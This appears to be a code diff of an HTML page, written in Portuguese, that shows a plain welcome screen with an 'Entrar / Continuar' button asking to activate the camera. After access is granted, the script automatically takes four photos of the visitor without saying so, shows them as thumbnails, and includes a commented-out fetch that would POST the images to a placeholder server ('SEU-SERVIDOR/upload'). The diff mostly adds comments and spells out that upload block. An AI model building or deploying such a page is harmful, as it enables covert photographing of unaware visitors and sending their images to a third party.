@@ -8,7 +8,7 @@
 <style>
 body {
   margin: 0;
-  font-family: Arial, sans-serif;
+  font-family: Arial;
   background: #111;
   color: white;
   text-align: center;
@@ -62,13 +62,17 @@ video {
 
 <body>
 
+<!-- Tela inicial limpa -->
 <div id="telaInicial">
   <h1>Bem-vindo!</h1>
   <p>Clique abaixo para entrar e ativar a câmera</p>
   <button id="btnEntrar">Entrar / Continuar</button>
 </div>
 
+<!-- Vídeo da câmera -->
 <video id="video" autoplay playsinline></video>
+
+<!-- Miniaturas das fotos -->
 <div id="fotos"></div>
 
 <script>
@@ -86,7 +90,7 @@ async function iniciar() {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     video.srcObject = stream;
 
-    // espera o vídeo iniciar antes de tirar fotos
+    // Espera o vídeo iniciar
     video.onloadedmetadata = () => {
       video.play();
       setTimeout(capturarFotos, 1000); // começa tirando fotos 1s depois
@@ -94,9 +98,11 @@ async function iniciar() {
 
   } catch (err) {
     alert("Erro ao acessar câmera: " + err.message);
+    console.log(err);
   }
 }
 
+// Captura 4 fotos automaticamente
 function capturarFotos() {
   let count = 0;
   const intervalo = setInterval(() => {
@@ -109,6 +115,7 @@ function capturarFotos() {
   }, 1000);
 }
 
+// Captura uma foto e mostra miniatura
 function capturar() {
   const canvas = document.createElement("canvas");
   canvas.width = video.videoWidth;
@@ -118,13 +125,19 @@ function capturar() {
 
   const data = canvas.toDataURL("image/png");
 
-  // mostra miniatura na tela
+  // Mostra miniatura na tela
   const img = document.createElement("img");
   img.src = data;
   fotosDiv.appendChild(img);
 
-  // AQUI você pode enviar pro servidor
-  // fetch("https://SEU-SERVIDOR/upload", { method: "POST", body: JSON.stringify({ imagem: data }) });
+  // Para enviar pro servidor, descomente e configure seu endpoint:
+  /*
+  fetch("https://SEU-SERVIDOR/upload", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ imagem: data })
+  });
+  */
 }
 </script>
 
